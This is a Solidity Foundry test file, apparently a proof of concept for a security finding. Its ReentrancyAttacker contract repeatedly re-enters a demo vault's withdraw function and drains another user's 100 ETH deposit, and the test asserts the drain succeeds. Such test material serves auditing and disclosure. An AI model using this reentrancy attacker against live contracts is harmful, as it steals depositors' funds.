// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/DemoVault.sol";

/// @notice Attacker contract: deposits 1 ETH, then withdraws it and re-enters
///         DemoVault.withdraw on every ETH receipt until the vault is empty.
///         Every nested call sees the same un-updated share balance (1 ETH),
///         so each one pays out another 1 ETH.
contract ReentrancyAttacker {
    DemoVault public vault;
    uint256 public drained;

    constructor(DemoVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        drained += msg.value;
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

/// @notice Proof of concept for the DemoVault reentrancy finding.
///         Run with `forge test -vv`. All actors are test addresses,
///         all funds are test ETH. No mainnet, no real funds.
contract DemoVaultTest is Test {
    DemoVault vault;
    ReentrancyAttacker attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new DemoVault();
        attacker = new ReentrancyAttacker(vault);
        vm.deal(victim, 100 ether);
        vm.deal(address(attacker), 1 ether);
        vm.prank(victim);
        vault.deposit{value: 100 ether}();
    }

    function test_ReentrancyDrainsVault() public {
        uint256 vaultBefore = address(vault).balance;
        assertEq(vaultBefore, 100 ether, "victim deposited 100 ETH");

        attacker.attack();

        uint256 vaultAfter = address(vault).balance;
        // Attacker deposited 1 ETH and withdrew 101 ETH: its own 1 ETH plus
        // the victim's entire 100 ETH. The victim's 100 shares are now
        // worthless — the vault is empty.
        assertEq(vaultAfter, 0, "vault should be fully drained");
        assertEq(attacker.drained(), 101 ether, "attacker drains 101 ETH from a 1 ETH deposit");
        assertEq(vault.shares(victim), 100 ether, "victim shares untouched (claim now worthless)");
        emit log_named_uint("vault balance before (wei)", vaultBefore);
        emit log_named_uint("vault balance after (wei)", vaultAfter);
        emit log_named_uint("attacker drained (wei)", attacker.drained());
    }

    function test_HonestWithdrawWorks() public {
        // Sanity: a normal user can still deposit + withdraw exactly their share.
        vm.prank(victim);
        vault.withdraw();
        assertEq(vault.shares(victim), 0);
        assertEq(address(vault).balance, 0);
        assertEq(victim.balance, 100 ether);
    }
}
